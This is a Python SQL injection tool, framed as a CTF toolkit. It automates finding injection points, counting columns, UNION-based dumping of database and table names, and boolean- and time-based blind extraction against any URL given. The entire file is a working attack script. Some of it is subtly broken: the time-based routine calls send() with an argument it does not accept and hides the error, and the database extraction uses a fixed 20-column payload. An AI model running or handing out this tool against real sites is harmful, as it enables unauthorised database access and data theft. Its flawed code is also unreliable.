#!/usr/bin/env python3
"""
CTF SQL Injection Toolkit - 自动化SQL注入工具
Usage: python3 sqli_toolkit.py <url> [--method POST] [--data "param=value"]
"""
import requests, sys, string, time, re

class SQLiTool:
    def __init__(self, url, method='GET', data=None, true_indicator=None):
        self.url = url
        self.method = method.upper()
        self.data = data
        self.true_indicator = true_indicator
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def send(self, payload):
        if self.method == 'GET':
            return self.session.get(self.url + payload, timeout=10)
        elif self.method == 'POST':
            if self.data:
                # Replace VALUE placeholder with payload in POST data
                modified = {}
                for k, v in self.data.items():
                    if v == 'INJECT':
                        modified[k] = payload
                    else:
                        modified[k] = v
                return self.session.post(self.url, data=modified, timeout=10)
            return self.session.post(self.url, data={'id': payload}, timeout=10)
    
    def detect_injection(self):
        """Detect if injection point exists"""
        print("[*] Detecting injection point...")
        
        payloads = [
            ("Single quote", "'"),
            ("Double quote", '"'),
            ("Boolean TRUE", " AND 1=1--+"),
            ("Boolean FALSE", " AND 1=2--+"),
            ("Comment test", "--+"),
            ("Parenthesis", ")"),
        ]
        
        base_resp = self.send("1")
        base_len = len(base_resp.text)
        
        results = []
        for name, payload in payloads:
            try:
                resp = self.send("1" + payload)
                diff = abs(len(resp.text) - base_len)
                has_error = any(err in resp.text.lower() for err in 
                    ['sql', 'syntax', 'error', 'mysql', 'warning', 'query'])
                results.append((name, payload, diff, has_error, resp.status_code))
                marker = " <== ERROR" if has_error else ""
                print(f"  [{resp.status_code}] {name}: length_diff={diff}{marker}")
            except Exception as e:
                print(f"  [ERR] {name}: {e}")
        
        return results
    
    def detect_columns(self):
        """Detect number of columns using ORDER BY"""
        print("\n[*] Detecting column count...")
        for i in range(1, 20):
            resp = self.send("1 ORDER BY {0}--+".format(i))
            if any(err in resp.text.lower() for err in ['error', 'unknown column', 'order by']):
                print(f"  Columns: {i-1}")
                return i - 1
        print("  Could not determine column count (max 20)")
        return None
    
    def find_union_position(self, num_cols):
        """Find which columns are displayed in output"""
        print(f"\n[*] Testing UNION SELECT with {num_cols} columns...")
        cols = ','.join(str(i) for i in range(1, num_cols + 1))
        resp = self.send(f"-1 UNION SELECT {cols}--+")
        
        positions = []
        for i in range(1, num_cols + 1):
            marker = f"UNION_POS_{i}"
            test_cols = ','.join(
                marker if j == i else str(j)
                for j in range(1, num_cols + 1)
            )
            resp = self.send(f"-1 UNION SELECT {test_cols}--+")
            if marker in resp.text:
                positions.append(i)
                print(f"  Column {i}: DISPLAYED")
            else:
                print(f"  Column {i}: hidden")
        
        return positions
    
    def extract_database(self, position):
        """Extract database name"""
        cols = ['NULL'] * 20
        cols[position - 1] = 'database()'
        payload = f"-1 UNION SELECT {','.join(cols[:len(cols)])}--+"
        resp = self.send(payload)
        
        # Try to find database name in response
        for match in re.findall(r'[a-zA-Z0-9_]+', resp.text):
            if len(match) > 2 and match not in ['NULL', 'UNION', 'SELECT', 'FROM']:
                return match
        return resp.text[:200]
    
    def extract_tables(self, position):
        """Extract table names (MySQL)"""
        cols = ['NULL'] * 20
        cols[position - 1] = "group_concat(table_name)"
        payload = f"-1 UNION SELECT {','.join(cols[:len(cols)])} FROM information_schema.tables WHERE table_schema=database()--+"
        resp = self.send(payload)
        return resp.text[:500]
    
    def blind_extract(self, condition_func, max_len=100):
        """Boolean-based blind extraction"""
        result = ''
        base_resp = self.send("1 AND 1=1--+")
        base_len = len(base_resp.text)
        threshold = abs(base_len - len(self.send("1 AND 1=2--+").text))
        
        for pos in range(1, max_len + 1):
            found = False
            for c in string.printable[:95]:
                payload = f"1 AND ASCII(SUBSTRING(({condition_func()}),{pos},1))={ord(c)}--+"
                resp = self.send(payload)
                if abs(len(resp.text) - base_len) < threshold:
                    result += c
                    print(f"  [{pos}] {c} -> {result}")
                    found = True
                    break
            if not found:
                print(f"  [{pos}] End of string")
                break
        return result
    
    def time_extract(self, condition_func, max_len=50, delay=3):
        """Time-based blind extraction"""
        result = ''
        
        for pos in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"1 AND IF(ASCII(SUBSTRING(({condition_func()}),{pos},1))>={mid},SLEEP({delay}),0)--+"
                start = time.time()
                try:
                    self.send(payload, timeout=delay + 5)
                except: pass
                elapsed = time.time() - start
                
                if elapsed >= delay - 0.5:
                    low = mid + 1
                else:
                    high = mid - 1
            
            if low > 32:
                char_code = low - 1
                result += chr(char_code)
                print(f"  [{pos}] {chr(char_code)} -> {result}")
            else:
                print(f"  [{pos}] End of string")
                break
        return result


def main():
    if len(sys.argv) < 2:
        print("CTF SQL Injection Toolkit")
        print("Usage: python3 sqli_toolkit.py <url> [options]")
        print("\nExamples:")
        print("  python3 sqli_toolkit.py 'http://target/page.php?id=1'")
        print("  python3 sqli_toolkit.py 'http://target/login.php' --method POST --data 'username=INJECT&password=x'")
        print("  python3 sqli_toolkit.py 'http://target/page.php?id=1' --blind 'SELECT flag FROM flags'")
        sys.exit(1)
    
    url = sys.argv[1]
    method = 'GET'
    data = None
    blind_target = None
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--method': method = sys.argv[i+1]; i += 2
        elif sys.argv[i] == '--data':
            parts = sys.argv[i+1].split('&')
            data = {p.split('=')[0]: p.split('=')[1] for p in parts}
            i += 2
        elif sys.argv[i] == '--blind':
            blind_target = sys.argv[i+1]; i += 2
        else: i += 1
    
    tool = SQLiTool(url, method, data)
    
    if blind_target:
        print(f"[*] Blind SQLi mode: {blind_target}")
        result = tool.time_extract(lambda: blind_target)
        print(f"\n[RESULT] {result}")
    else:
        results = tool.detect_injection()
        num_cols = tool.detect_columns()
        if num_cols:
            positions = tool.find_union_position(num_cols)
            if positions:
                print(f"\n[*] Extracting from column position: {positions[0]}")
                print(f"[DATABASE] {tool.extract_database(positions[0])}")
                print(f"[TABLES] {tool.extract_tables(positions[0])}")

if __name__ == '__main__':
    main()
